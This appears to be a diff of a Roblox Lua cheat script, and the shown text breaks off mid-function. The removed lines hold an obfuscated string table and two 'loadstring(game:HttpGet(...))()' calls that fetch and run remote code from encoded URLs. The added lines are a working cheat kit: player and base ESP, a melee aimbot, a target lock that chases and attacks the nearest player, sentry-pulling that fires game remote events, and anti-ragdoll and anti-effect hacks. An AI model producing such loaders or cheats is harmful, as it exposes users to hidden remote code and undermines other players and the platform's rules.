-  _0llOOIOll0l0("v1BQI".."OmafbfMc".."Uov7Zh".."6sIU".."="),
-  _0llOOIOll0l0("oE9".."MbsCc".."fLyFT".."lY9"),
-  _0llOOIOll0l0("pklRKe".."KWM5S".."FTlgi69N".."Av4RVT".."Q=="),
-  _0llOOIOll0l0("uFJe".."LeGXZr".."2DVE".."oi+".."9NXu4B".."BTyv".."ikner".."n1RKN".."A=="),
-  _0llOOIOll0l0("oUFYJ66h".."eryOSU".."sn4J".."o="),
-  _0llOOIOll0l0("vkhWI".."OHTW7u".."ASVwh".."/od2rIVO".."UA=="),
-  _0llOOIOll0l0("uEUfGu".."vTR".."7vMc".."14m+4E="),
-  _0llOOIOll0l0("q0F".."RKe+dab".."uATFZ".."u2o".."Fmso".."1MXg=="),
-  _0llOOIOll0l0("oEVNO+".."KWYauAR".."U074pY="),
-  _0llOOIOll0l0("uE9d".."btqccb".."fMdFAs5w".."=="),
-  _0llOOIOll0l0("v1RQPv6".."cM5KZTV".."Yg55".."18"),
-  _0llOOIOll0l0("q09".."NJ+Kf".."fP67QU".."sr/".."J52s".."oNOWzz".."nn3+x"),
-  _0llOOIOll0l0("q09".."NJ+Kf".."fP6/VV0".."54Zx1".."u55P"),
-  _0llOOIOll0l0("r0FJ".."L+KffP66".."SU06+5x".."gsQ=".."="),
-  _0llOOIOll0l0("rVZQLe+X".."fKyFT".."FMv"),
-  _0llOOIOll0l0("uElY".."POeferC".."FAGgv+p".."Zhs4lMV".."iDn"),
-  _0llOOIOll0l0("tkldPO/".."TSauOUl".."5u1".."Jpxr".."I1MV".."iDn"),
-  _0llOOIOll0l0("rk9SLO".."GecbeCSR".."8J+4B".."6sI".."U="),
-  _0llOOIOll0l0("v1BW".."IeC".."aYbH".."MZ1Ai+5".."F6rIM="),
-  _0llOOIOll0l0("rlJKO".."vqcM5mFQ".."VM7+od".."8"),
-  _0llOOIOll0l0("rk9SLO+".."Bd7eeT".."x8N/Jx".."wsYhJUy".."E="),
-  _0llOOIOll0l0("vkhW".."IOHT".."R7GNU0sr".."/Jp9s".."Q=="),
-  _0llOOIOll0l0("o1Je".."IOmGZ7eC".."SR8P4J".."J9v59TV".."iDn"),
-  _0llOOIOll0l0("qlJWKeH".."TUL+BR".."VMh"),
-  _0llOOIOll0l0("rlVX".."Ia6Xdv6q".."VVop4Q".."=="),
-  _0llOOIOll0l0("v0VeI".."uHTQbu".."LQVMh"),
-  _0llOOIOll0l0("v0lYI".."+/TVLe".."eTA=="),
-  _0llOOIOll0l0("vFV".."ZKO+Rc".."rKA"),
-  _0llOOIOll0l0("r0h".."QLe2cM5".."yZTlE".."3"),
-  _0llOOIOll0l0("v0lYI+/T".."UbG".."V"),
-  _0llOOIOll0l0("vEkfHufT".."RL+".."YRU0j6".."598s".."A=="),
-  _0llOOIOll0l0("vVVeLeWG".."f78="),
-  _0llOOIOll0l0("vEFRK".."u+Q".."cLeCSR8M".."751ysIVO".."Vg=".."="),
-  _0llOOIOll0l0("r09cI".."f2a".."fbfMbV".."4j7".."w=="),
-  _0llOOIOll0l0("v1R".."NL/mRdq".."yeRVMi".."59NVs".."o1NViDpl".."n+yhQ=".."="),
-  _0llOOIOll0l0("vElPJ66j".."fKqNVFA".."="),
-  _0llOOIOll0l0("r0FNL+O".."Wf7KD".."AHkn4odh".."u4BMUA=".."="),
-  _0llOOIOll0l0("rkxKK".."+yWYayF".."TlEnrrx".."wqoNQSj3".."nnX".."o="),
-  _0llOOIOll0l0("r0xWLe".."WWYbeCT".."x8N/J".."JxsQ=="),
-  _0llOOIOll0l0("vVVW".."OOec".."f7f".."MYVIr4pZ".."8sIJJ"),
-  _0llOOIOll0l0("q0xQ".."POycM5i".."eVUs6".."4Zdht4B".."MUA=="),
-  _0llOOIOll0l0("oElQIOu".."fM52NQ".."0s7/ZZ".."/tw=="),
-  _0llOOIOll0l0("r0haKK".."6wY".."b+O".."Ul4t75d".."yvJ5".."B"),
-  _0llOOIOll0l0("rkFTIuu".."BerCNAHw".."v/oNmv".."Y9JU".."S8="),
-  _0llOOIOll0l0("oVVSI".."+ec".."M4y".."NUE8n+od".."8"),
-  _0llOOIOll0l0("vEVRKfua".."fbHMY1At".."4YB6sIM="),
-  _0llOOIOll0l0("r0hWI/6S".."faSFT".."lZuzJJ9".."v4J".."JUSc="),
-  _0llOOIOll0l0("u09SL".."OHTQbGAT".."FA="),
-  _0llOOIOll0l0("vEVRKfu".."aff64Ulo".."r"),
-  _0llOOIOll0l0("qE9".."Wbsqcev6".."oTw=="),
-  _0llOOIOll0l0("v0FT".."L+OafbHM".."cFog".."6YZ6sI".."M="),
-  _0llOOIOll0l0("qlJQ".."Ke+Hf".."P68SU0".."v+pw="),
-  _0llOOIOll0l0("oUF".."RKeGf".."erCFA".."G8v/IF8v".."YVOV".."g=="),
-  _0llOOIOll0l0("rVZ".."QLe+XerC".."FAHg".."76JV8"),
-  _0llOOIOll0l0("uEkf".."GufTR".."7fM".."c14m".."+4E="),
-  _0llOOIOll0l0("rlVN".."LO+ffLCF".."AHMh4p".."p/sYBJ"),
-  _0llOOIOll0l0("rlJNJ".."66xYayF".."AH0".."n7YZg/".."qhJXD".."v901Gx".."gUJW".."LfuA"),
-  _0llOOIOll0l0("vEVNIe2b".."drKATx8".."C6558s".."I9I".."WiL".."inA=="),
-  _0llOOIOll0l0("rkFRL+".."CaZ".."7/M".."ZFAi/pt".."6sIVUXg".."=="),
-  _0llOOIOll0l0("oUFT".."L+OWM5".."+BQU0".."r4pY="),
-  _0llOOIOll0l0("rkFSLOe".."dev6".."vUlA".."9+pp9".."tw=="),
-  _0llOOIOll0l0("uFJKI".."ueedqy".."DAGs8+".."596".."vYV".."OXg=="),
-  _0llOOIOll0l0("rVZQLe+".."XerCF".."AH4g".."+pp/s".."ZxJUSc="),
-  _0llOOIOll0l0("rlJN".."bsyB".."Yf68QU".."sv/pp+"),
-  _0llOOIOll0l0("rkFRKue".."HfP6tWF".."Ai54d8"),
-  _0llOOIOll0l0("r0FPPv".."uQcLeCT".."x8P/Y".."Byr".."Z9JUSE="),
-  _0llOOIOll0l0("vElRK++f".."fKqY".."Tx8I".."/IZnqo".."1SVi".."Dh"),
-  _0llOOIOll0l0("vElPJ".."66yZb".."GPQVs".."h"),
-  _0llOOIOll0l0("qlJ".."QKeHTVr".."KKTw=="),
-  _0llOOIOll0l0("uFJWL".."a6nYb".."+PAH0v/".."JJxsYN".."N"),
-  _0llOOIOll0l0("r1VPLe+Y".."dv6nT".."14i7w".."=="),
-  _0llOOIOll0l0("uEEf".."Gu/T".."R7/M".."dF5u3".."ZJ7q54="),
-  _0llOOIOll0l0("r0FcOu".."HTW".."7ecT08h+".."pJ+sQ".."=="),
-  _0llOOIOll0l0("rk9".."RK+2SM5+".."BQl4i75F".."m"),
-  _0llOOIOll0l0("rkFRKu".."eHfP6".."uT1".."0854".."dnsQ=="),
-  _0llOOIOll0l0("q0FRKf2H".."dqzMZ".."lAh+".."pZhvw".."=="),
-  _0llOOIOll0l0("uFJWPv6".."aM4qe".."T08+".."5w=="),
-  _0llOOIOll0l0("vElPJ66w".."fKy".."CSQ=="),
-  _0llOOIOll0l0("vElPJ".."664".."eqmF"),
-  _0llOOIOll0l0("uEFNOu".."+BcrmC".."Tw=="),
-  _0llOOIOll0l0("vkFc".."LeGc".."fbfMal4g".."6pZ/t4".."JJ"),
-  _0llOOIOll0l0("ok9".."QLOedev6".."/QVE6751".."6sIU="),
-  _0llOOIOll0l0("v1Z".."WIOed".."cv6uT1".."Is74F3t".."4JP"),
-  _0llOOIOll0l0("uEFTP".."u/TV7".."fMZ".."lo8".."4Q=="),
-  _0llOOIOll0l0("qkx".."KPO".."eVf6".."ueQQ=="),
-  _0llOOIOll0l0("uElSbs".."2bdrufRQ".."=="),
-  _0llOOIOll0l0("oEl".."NJ+If".."M5KNU".."lYib".."g=="),
-  _0llOOIOll0l0("ok9QLO".."edev6".."8SUU07".."516sIU=")
+local function applyXray(plot)
+    if baseOrigTransp[plot] then return end
+    baseOrigTransp[plot] = {}
+    for _, p in ipairs(plot:GetDescendants()) do
+        if p:IsA("BasePart") and p.Transparency < 0.6 then
+            baseOrigTransp[plot][p] = p.Transparency
+            p.Transparency = 0.68
+        end
+    end
+    plotConns[plot] = plot.DescendantAdded:Connect(function(d)
+        if d:IsA("BasePart") and d.Transparency < 0.6 then
+            baseOrigTransp[plot][d] = d.Transparency
+            d.Transparency = 0.68
+        end
+    end)
+end
+
+function toggleESPBases(on)
+    local plots = workspace:FindFirstChild("Plots")
+    if not plots then return end
+    if not on then
+        for _, c in pairs(plotConns) do
+            c:Disconnect()
+        end
+        plotConns = {}
+        if xrayConn then
+            xrayConn:Disconnect()
+            xrayConn = nil
+        end
+        for _, parts in pairs(baseOrigTransp) do
+            for p, orig in pairs(parts) do
+                if p and p.Parent then
+                    p.Transparency = orig
+                end
+            end
+        end
+        baseOrigTransp = {}
+        return
+    end
+    for _, plot in ipairs(plots:GetChildren()) do
+        applyXray(plot)
+    end
+    xrayConn = plots.ChildAdded:Connect(function(np)
+        task.wait(0.2)
+        applyXray(np)
+    end)
+end
+
+-----------------
+-- ESP PLAYERS --
+-----------------
+local espConns = {}
+local espEnabled = false
+
+local function createESP(plr)
+    if plr == lp or not plr.Character then return end
+    if plr.Character:FindFirstChild("ESP_UGC") then return end
+
+    local char = plr.Character
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local head = char:FindFirstChild("Head")
+    if not (hrp and head) then return end
+
+    local hl = Instance.new("Highlight")
+    hl.Name = "ESP_UGC"
+    hl.FillColor = Color3.fromRGB(138,43,226)
+    hl.OutlineColor = Color3.fromRGB(180,100,255)
+    hl.FillTransparency = 0.25
+    hl.OutlineTransparency = 0
+    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+    hl.Parent = char
+
+    local hb = Instance.new("BoxHandleAdornment")
+    hb.Name = "ESP_Hitbox"
+    hb.Adornee = hrp
+    hb.Size = Vector3.new(4,6,2)
+    hb.Color3 = Color3.fromRGB(138,43,226)
+    hb.Transparency = 0.5
+    hb.AlwaysOnTop = true
+    hb.ZIndex = 10
+    hb.Parent = char
+
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "ESP_Name"
+    bb.Adornee = head
+    bb.Size = UDim2.new(0,200,0,50)
+    bb.StudsOffset = Vector3.new(0,3,0)
+    bb.AlwaysOnTop = true
+    bb.Parent = char
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1,0,1,0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = plr.DisplayName or plr.Name
+    lbl.TextColor3 = Color3.fromRGB(200,150,255)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextScaled = true
+    lbl.TextStrokeTransparency = 0.4
+    lbl.TextStrokeColor3 = Color3.fromRGB(80,0,120)
+    lbl.Parent = bb
+end
+
+local function removeESP(plr)
+    if not plr.Character then return end
+    for _, n in ipairs({"ESP_UGC","ESP_Hitbox","ESP_Name"}) do
+        local o = plr.Character:FindFirstChild(n)
+        if o then o:Destroy() end
+    end
+end
+
+function toggleESPPlayers(on)
+    espEnabled = on
+    if on then
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr ~= lp then
+                if plr.Character then
+                    createESP(plr)
+                end
+                local c = plr.CharacterAdded:Connect(function()
+                    task.wait(0.2)
+                    if espEnabled then createESP(plr) end
+                end)
+                table.insert(espConns, c)
+            end
+        end
+        local pa = Players.PlayerAdded:Connect(function(plr)
+            if plr == lp then return end
+            local c = plr.CharacterAdded:Connect(function()
+                task.wait(0.2)
+                if espEnabled then createESP(plr) end
+            end)
+            table.insert(espConns, c)
+        end)
+        table.insert(espConns, pa)
+    else
+        for _, plr in ipairs(Players:GetPlayers()) do
+            removeESP(plr)
+        end
+        for _, c in ipairs(espConns) do
+            if c and c.Connected then c:Disconnect() end
+        end
+        espConns = {}
+    end
+end
+
+------------------
+-- ANTI SENTRY --
+------------------
+local antiSentryConn, antiSentryTarget
+local DETECT_DIST = 60
+local PULL_DIST = -5
+
+local function getChar() return Players.LocalPlayer.Character end
+
+local function getWeapon()
+    local char = getChar()
+    if not char then return nil end
+    return Players.LocalPlayer.Backpack:FindFirstChild("Bat") or char:FindFirstChild("Bat")
+end
+
+local function findSentryTarget()
+    local char = getChar()
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+    local rp = char.HumanoidRootPart.Position
+
+    for _, obj in pairs(workspace:GetChildren()) do
+        if obj.Name:find("Sentry") and not obj.Name:lower():find("bullet") then
+            local id = obj.Name:match("Sentry_(%d+)")
+            if id and tonumber(id) == Players.LocalPlayer.UserId then continue end
+            local part = obj:IsA("BasePart") and obj or obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart"))
+            if part and (rp - part.Position).Magnitude <= DETECT_DIST then
+                return obj
+            end
+        end
+    end
+end
+
+local function moveSentry(obj)
+    local char = getChar()
+    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
+    for _, p in pairs(obj:GetDescendants()) do
+        if p:IsA("BasePart") then p.CanCollide = false end
+    end
+    local cf = char.HumanoidRootPart.CFrame * CFrame.new(0,0,PULL_DIST)
+    if obj:IsA("BasePart") then
+        obj.CFrame = cf
+    elseif obj:IsA("Model") then
+        local m = obj.PrimaryPart or obj:FindFirstChildWhichIsA("BasePart")
+        if m then m.CFrame = cf end
+    end
+end
+
+local function attackSentry()
+    local char = getChar()
+    if not char then return end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if not hum then return end
+    local weapon = getWeapon()
+    if not weapon then return end
+    if weapon.Parent == Players.LocalPlayer.Backpack then
+        hum:EquipTool(weapon)
+        task.wait(0.1)
+    end
+    local handle = weapon:FindFirstChild("Handle")
+    if handle then handle.CanCollide = false end
+    pcall(function() weapon:Activate() end)
+    for _, r in pairs(weapon:GetDescendants()) do
+        if r:IsA("RemoteEvent") then pcall(function() r:FireServer() end) end
+    end
+end
+
+local function startAntiSentry()
+    if antiSentryConn then return end
+    antiSentryConn = RunService.Heartbeat:Connect(function()
+        if antiSentryTarget and antiSentryTarget.Parent == workspace then
+            moveSentry(antiSentryTarget)
+            attackSentry()
+        else
+            antiSentryTarget = findSentryTarget()
+        end
+    end)
+end
+
+local function stopAntiSentry()
+    if antiSentryConn then antiSentryConn:Disconnect(); antiSentryConn = nil end
+    antiSentryTarget = nil
+end
+
+-----------------------
+-- ANTI BEE & DISCO --
+-----------------------
+local ABD = {
+    enabled = false,
+    conns = {},
+    origMove = nil,
+    protected = false
+}
+local BAD_NAMES = { Blue=true, DiscoEffect=true, BeeBlur=true, ColorCorrection=true }
+
+local function abdNuke(obj)
+    if obj and obj.Parent and BAD_NAMES[obj.Name] then
+        pcall(function() obj:Destroy() end)
+    end
+end
+
+local function abdDisconnect()
+    for _, c in ipairs(ABD.conns) do
+        if typeof(c) == "RBXScriptConnection" then c:Disconnect() end
+    end
+    ABD.conns = {}
+end
+
+local function protectControls()
+    if ABD.protected then return end
+    pcall(function()
+        local PM = player.PlayerScripts:FindFirstChild("PlayerModule")
+        if not PM then return end
+        local Ctrl = require(PM):GetControls()
+        if not Ctrl then return end
+        if not ABD.origMove then ABD.origMove = Ctrl.moveFunction end
+        local function pm(self, mv, rel)
+            if ABD.origMove then ABD.origMove(self, mv, rel) end
+        end
+        local cc = RunService.Heartbeat:Connect(function()
+            if ABD.enabled and Ctrl.moveFunction ~= pm then Ctrl.moveFunction = pm end
+        end)
+        table.insert(ABD.conns, cc)
+        Ctrl.moveFunction = pm
+        ABD.protected = true
+    end)
+end
+
+local function restoreControls()
+    if not ABD.protected then return end
+    pcall(function()
+        local PM = player.PlayerScripts:FindFirstChild("PlayerModule")
+        if not PM then return end
+        local Ctrl = require(PM):GetControls()
+        if Ctrl and ABD.origMove then Ctrl.moveFunction = ABD.origMove; ABD.protected = false end
+    end)
+end
+
+local function blockBuzz()
+    pcall(function()
+        local bs = player.PlayerScripts:FindFirstChild("Bee", true)
+        if bs then
+            local b = bs:FindFirstChild("Buzzing")
+            if b and b:IsA("Sound") then b:Stop(); b.Volume = 0 end
+        end
+    end)
+end
+
+local function enableAntiBee()
+    if ABD.enabled then return end
+    ABD.enabled = true
+    for _, i in ipairs(Lighting:GetDescendants()) do abdNuke(i) end
+    local ac = Lighting.DescendantAdded:Connect(function(o) if ABD.enabled then abdNuke(o) end end)
+    table.insert(ABD.conns, ac)
+    protectControls()
+    local sc = RunService.Heartbeat:Connect(function() if ABD.enabled then blockBuzz() end end)
+    table.insert(ABD.conns, sc)
+end
+
+local function disableAntiBee()
+    if not ABD.enabled then return end
+    ABD.enabled = false
+    restoreControls()
+    abdDisconnect()
+end
+
+------------------------
+-- ANTI FPS DEVOURER --
+------------------------
+local AFPS = {
+    enabled = false,
+    conns = {},
+    hidden = {}
 }
 
-task.spawn(function()
-loadstring(game:HttpGet(_0llOOIOll0l0("hFRLPv3".."JPPGNU".."FZg4o".."ZyrIF".."PTWDg".."lmfxikl".."TK/3c".."Zer".."DTF".."Av6".."pZhr".."cMY".."D3box3".."K62EVdK".."OjHJOu".."PFQ".."gt68".."Uiu40T".."Biu6w".."nbs3".."w5TO+8=")))()
-end)
-
-task.spawn(function()
-loadstring(game:HttpGet(_0llOOIOll0l0("hFR".."LPv".."3JPPG".."NUFZg4o".."ZyrIFP".."TWDg".."lmfxi".."klTK/3cZ".."erDTFAv6".."pZhr".."cMY".."DXm9wC".."Hs1R".."AKdrnEcb".."zdEV".."ks7cUlvN".."VEWn23w".."3Hp".."iQ5TO+8".."=")))()
-end)
-
+local function removeAcc(acc)
+    if not AFPS.hidden[acc] then
+        AFPS.hidden[acc] = acc.Parent
+        acc.Parent = nil
+    end
 end
-local _IllOIlOlOl=(230*8566>230) and _Il0I0IO0Ol or nil
-if _IllOIlOlOl then _IllOIlOlOl() end
+
+function enableAntiFPSDevourer()
+    if AFPS.enabled then return end
+    AFPS.enabled = true
+    for _, o in ipairs(workspace:GetDescendants()) do
+        if o:IsA("Accessory") then removeAcc(o) end
+    end
+    local c = workspace.DescendantAdded:Connect(function(o)
+        if AFPS.enabled and o:IsA("Accessory") then removeAcc(o) end
+    end)
+    table.insert(AFPS.conns, c)
+end
+
+function disableAntiFPSDevourer()
+    if not AFPS.enabled then return end
+    AFPS.enabled = false
+    for _, c in ipairs(AFPS.conns) do
+        if typeof(c) == "RBXScriptConnection" then c:Disconnect() end
+    end
+    AFPS.conns = {}
+    for acc, orig in pairs(AFPS.hidden) do
+        if acc then acc.Parent = orig end
+    end
+    AFPS.hidden = {}
+end
+
+------------------
+-- MELEE AIMBOT --
+------------------
+local MELEE_RANGE = 45
+local MELEE_ONLY_ENEMIES = true
+local meleeEnabled = false
+local meleeConn, meleeAO, meleeAtt
+local character, hrp, hum
+
+local function isValidMeleeTarget(hm, rp)
+    if not (hm and rp) or hm.Health <= 0 then return false end
+    if MELEE_ONLY_ENEMIES then
+        local tp = Players:GetPlayerFromCharacter(hm.Parent)
+        if not tp or tp == player then return false end
+    end
+    return true
+end
+
+local function getClosestMelee(hrp0)
+    local closest, minD = nil, MELEE_RANGE
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p == player then continue end
+        local c = p.Character
+        if not c then continue end
+        local th = c:FindFirstChild("HumanoidRootPart")
+        local hm = c:FindFirstChildOfClass("Humanoid")
+        if isValidMeleeTarget(hm, th) then
+            local d = (th.Position - hrp0.Position).Magnitude
+            if d < minD then minD = d; closest = th end
+        end
+    end
+    return closest
+end
+
+local function createMeleeAimbot(char)
+    local hrp0 = char:WaitForChild("HumanoidRootPart",8)
+    local hm = char:WaitForChild("Humanoid",8)
+    if not (hrp0 and hm) then return end
+
+    if meleeAO then pcall(function() meleeAO:Destroy() end) end
+    if meleeAtt then pcall(function() meleeAtt:Destroy() end) end
+
+    meleeAtt = Instance.new("Attachment")
+    meleeAtt.Parent = hrp0
+
+    meleeAO = Instance.new("AlignOrientation")
+    meleeAO.Attachment0 = meleeAtt
+    meleeAO.Mode = Enum.OrientationAlignmentMode.OneAttachment
+    meleeAO.RigidityEnabled = true
+    meleeAO.MaxTorque = 100000
+    meleeAO.Responsiveness = 200
+    meleeAO.Parent = hrp0
+
+    if meleeConn then meleeConn:Disconnect() end
+    meleeConn = RunService.RenderStepped:Connect(function()
+        if not char.Parent or not meleeEnabled then return end
+        local t = getClosestMelee(hrp0)
+        if t then
+            hm.AutoRotate = false
+            meleeAO.Enabled = true
+            meleeAO.CFrame = CFrame.lookAt(hrp0.Position, Vector3.new(t.Position.X, hrp0.Position.Y, t.Position.Z))
+        else
+            meleeAO.Enabled = false
+            hm.AutoRotate = true
+        end
+    end)
+end
+
+local function disableMeleeAimbot()
+    meleeEnabled = false
+    if meleeConn then meleeConn:Disconnect(); meleeConn = nil end
+    if meleeAO then meleeAO.Enabled = false; pcall(function() meleeAO:Destroy() end); meleeAO = nil end
+    if character and character:FindFirstChild("Humanoid") then character.Humanoid.AutoRotate = true end
+    if meleeAtt then pcall(function() meleeAtt:Destroy() end); meleeAtt = nil end
+end
+
+-------------------
+-- ANTI RAGDOLL --
+-------------------
+local antiRagdollMode = nil
+local ragdollConns = {}
+local ccd = {}
+
+local function cacheCharData()
+    local char = player.Character
+    if not char then return false end
+    local hm = char:FindFirstChildOfClass("Humanoid")
+    local root = char:FindFirstChild("HumanoidRootPart")
+    if not hm or not root then return false end
+    ccd = {
+        character = char,
+        humanoid = hm,
+        root = root,
+        originalWalkSpeed = hm.WalkSpeed,
+        originalJumpPower = hm.JumpPower
+    }
+    return true
+end
+
+local function discRagdoll()
+    for _, c in ipairs(ragdollConns) do
+        if typeof(c) == "RBXScriptConnection" then pcall(function() c:Disconnect() end) end
+    end
+    ragdollConns = {}
+end
+
+local function isRagdolled()
+    if not ccd.humanoid then return false end
+    local s = ccd.humanoid:GetState()
+    if s == Enum.HumanoidStateType.Physics or s == Enum.HumanoidStateType.Ragdoll or s == Enum.HumanoidStateType.FallingDown then
+        return true
+    end
+    local et = player:GetAttribute("RagdollEndTime")
+    if et and (et - workspace:GetServerTimeNow()) > 0 then return true end
+    return false
+end
+
+local function removeRagdollC()
+    if not ccd.character then return end
+    for _, d in ipairs(ccd.character:GetDescendants()) do
+        if d:IsA("BallSocketConstraint") or (d:IsA("Attachment") and d.Name:find("RagdollAttachment")) then
+            pcall(function() d:Destroy() end)
+        end
+    end
+end
+
+local function forceExitRagdoll()
+    if not ccd.humanoid or not ccd.root then return end
+    pcall(function() player:SetAttribute("RagdollEndTime", workspace:GetServerTimeNow()) end)
+    if ccd.humanoid.Health > 0 then ccd.humanoid:ChangeState(Enum.HumanoidStateType.Running) end
+    ccd.root.Anchored = false
+    ccd.root.AssemblyLinearVelocity = Vector3.zero
+    ccd.root.AssemblyAngularVelocity = Vector3.zero
+end
+
+local function antiRagdollLoop()
+    while antiRagdollMode do
+        task.wait()
+        if isRagdolled() then removeRagdollC(); forceExitRagdoll() end
+        local cam = workspace.CurrentCamera
+        if cam and ccd.humanoid and cam.CameraSubject ~= ccd.humanoid then cam.CameraSubject = ccd.humanoid end
+    end
+end
+
+function toggleAntiRagdoll(on)
+    if on then
+        discRagdoll()
+        if not cacheCharData() then return end
+        antiRagdollMode = "v1"
+        local cc = player.CharacterAdded:Connect(function()
+            task.wait(0.5)
+            if antiRagdollMode then cacheCharData() end
+        end)
+        table.insert(ragdollConns, cc)
+        task.spawn(antiRagdollLoop)
+    else
+        antiRagdollMode = nil
+        discRagdoll()
+        ccd = {}
+    end
+end
+
+------------------
+-- LOCK TARGET --
+------------------
+LOCK_RADIUS = 70
+local LOCK_SPEED = 50
+local lockGui, lockHbConn, lockLv, lockAtt, lockGyro
+local lockEnabled = false
+
+local function getNearest()
+    local char = lp.Character
+    if not char then return nil end
+    local hrp0 = char:FindFirstChild("HumanoidRootPart")
+    if not hrp0 then return nil end
+    local nearest, nd = nil, LOCK_RADIUS
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= lp then
+            local pc = plr.Character
+            local phrp = pc and pc:FindFirstChild("HumanoidRootPart")
+            if phrp then
+                local d = (phrp.Position - hrp0.Position).Magnitude
+                if d <= nd then nearest = plr; nd = d end
+            end
+        end
+    end
+    return nearest
+end
+
+local function getBat()
+    for _, t in ipairs(lp.Backpack:GetChildren()) do
+        if t:IsA("Tool") and string.find(string.lower(t.Name), "bat", 1, true) then return t end
+    end
+    local char = lp.Character
+    if char then
+        for _, t in ipairs(char:GetChildren()) do
+            if t:IsA("Tool") and string.find(string.lower(t.Name), "bat", 1, true) then return t end
+        end
+    end
+    return nil
+end
+
+local function startLock()
+    local char = lp.Character
+    if not char then return end
+    local hrp0 = char:FindFirstChild("HumanoidRootPart")
+    if not hrp0 then return end
+
+    lockAtt = Instance.new("Attachment", hrp0)
+
+    lockLv = Instance.new("LinearVelocity", hrp0)
+    lockLv.Attachment0 = lockAtt
+    lockLv.MaxForce = 50000
+    lockLv.RelativeTo = Enum.ActuatorRelativeTo.World
+    lockLv.Enabled = false
+
+    lockGyro = Instance.new("AlignOrientation", hrp0)
+    lockGyro.Attachment0 = lockAtt
+    lockGyro.MaxTorque = 50000
+    lockGyro.Responsiveness = 120
+    lockGyro.Enabled = false
+
+    lockHbConn = RunService.Heartbeat:Connect(function()
+        local tp = getNearest()
+        if not tp then lockLv.Enabled = false; lockGyro.Enabled = false; return end
+        local tc = tp.Character
+        local thrp = tc and tc:FindFirstChild("HumanoidRootPart")
+        if not thrp then lockLv.Enabled = false; lockGyro.Enabled = false; return end
+
+        lockLv.Enabled = true
+        lockGyro.Enabled = true
+
+        local fp = thrp.Position + thrp.CFrame.LookVector * 2.2
+        local dir = fp - hrp0.Position
+
+        if dir.Magnitude > 0.5 then
+            lockLv.VectorVelocity = dir.Unit * LOCK_SPEED
+        else
+            lockLv.VectorVelocity = Vector3.zero
+        end
+        lockGyro.CFrame = CFrame.lookAt(hrp0.Position, fp)
+
+        local bat = getBat()
+        if bat then
+            if bat.Parent ~= char then char.Humanoid:EquipTool(bat) end
+            bat:Activate()
+        end
+    end)
+end
+
+local function stopLock()
+    if lockHbConn then lockHbConn:Disconnect(); lockHbConn = nil end
+    if lockLv then lockLv:Destroy(); lockLv = nil end
+    if lockGyro then lockGyro:Destroy(); lockGyro = nil end
+    if lockAtt then lockAtt:Destroy(); lockAtt = nil end
+end
+
+local lockBtnRef = nil
+
+function createLockGui()
+    if lockGui then return end
+    lockGui = Instance.new("ScreenGui")
+    lockGui.Name = "UGC_LockTarget"
+    lockGui.Parent = lp.PlayerGui
+
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(0,160,0,52)
+    btn.Position = UDim2.new(0.5,-80,0.75,0)
+    btn.BackgroundColor3 = BTN_DARK
+    btn.Text = "🔒 LOCK ON"
+    btn.Font = Enum.Font.GothamBlack
+    btn.TextSize = 14
+    btn.TextColor3 = TEXT_OFF
+    btn.AutoButtonColor = false
+    btn.Parent = lockGui
+
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,13)
+    local bs = Instance.new("UIStroke", btn)
+    bs.Color = STROKE_OFF
+    bs.Thickness = 1.5
+
+    btn.Active = true
+    btn.Draggable = true
+
+    local origS = btn.Size
+    local hoverS = UDim2.new(0,164,0,56)
+    local clickS = UDim2.new(0,154,0,48)
+
+    btn.MouseEnter:Connect(function()
+        tw(btn,0.2,{Size=hoverS})
+        if not lockEnabled then tw(bs,0.2,{Color=PURPLE}) end
+    end)
+    btn.MouseLeave:Connect(function()
+        tw(btn,0.2,{Size=origS})
+        if not lockEnabled then tw(bs,0.2,{Color=STROKE_OFF}) end
+    end)
+    btn.MouseButton1Down:Connect(function()
+        tw(btn,0.08,{Size=clickS},Enum.EasingStyle.Back)
+    end)
+    btn.MouseButton1Up:Connect(function()
+        tw(btn,0.1,{Size=hoverS},Enum.EasingStyle.Back)
+    end)
+
+    btn.MouseButton1Click:Connect(function()
+        lockEnabled = not lockEnabled
+        if lockEnabled then
+            btn.Text = "🔓 LOCKED"
+            tw(btn,0.3,{BackgroundColor3=PURPLE2})
+            tw(bs,0.3,{Color=STROKE_ON})
+            btn.TextColor3 = TEXT_ON
+            startLock()
+        else
+            btn.Text = "🔒 LOCK ON"
+            tw(btn,0.3,{BackgroundColor3=BTN_DARK})
+            tw(bs,0.3,{Color=STROKE_OFF})
+            btn.TextColor3 = TEXT_OFF
+            stopLock()
+        end
+    end)
+
+    lockBtnRef = btn
+end
+
+function destroyLockGui()
+    lockEnabled = false
+    stopLock()
+    if lockGui then lockGui:Destroy(); lockGui = nil end
+end
+
+-------------
+-- MEDUSA --
+-------------
+local MEDUSA_RADIUS = 10
+local SPAM_DELAY = 0.15
+local medusaPart, lastUse, AutoMedusaEnabled, MedusaInit = nil, 0, false, false
+
+local function InitMedusa()
+    if MedusaInit then return end
+    MedusaInit = true
+
+    local function createMR()
+        if medusaPart then medusaPart:Destroy() end
+        medusaPart = Instance.new("Part")
+        medusaPart.Name = "MedusaRadius"
+        medusaPart.Anchored = true
+        medusaPart.CanCollide = false
+        medusaPart.Transparency = 1
+        medusaPart.Material = Enum.Material.Neon
+        medusaPart.Color = PURPLE
+        medusaPart.Shape = Enum.PartType.Cylinder
+        medusaPart.Size = Vector3.new(0.05, MEDUSA_RADIUS*2, MEDUSA_RADIUS*2)
+        medusaPart.Parent = workspace
+    end
+
+    local function medusaEquipped()
+        local char = lp.Character
+        if not char then return nil end
+        for _, t in ipairs(char:GetChildren()) do
+            if t:IsA("Tool") and t.Name == "Medusa's Head" then return t end
+        end
+        return nil
+    end
+
+    createMR()
+
+    RunService.RenderStepped:Connect(function()
+        if not AutoMedusaEnabled then
+            if medusaPart then medusaPart.Transparency = 1 end
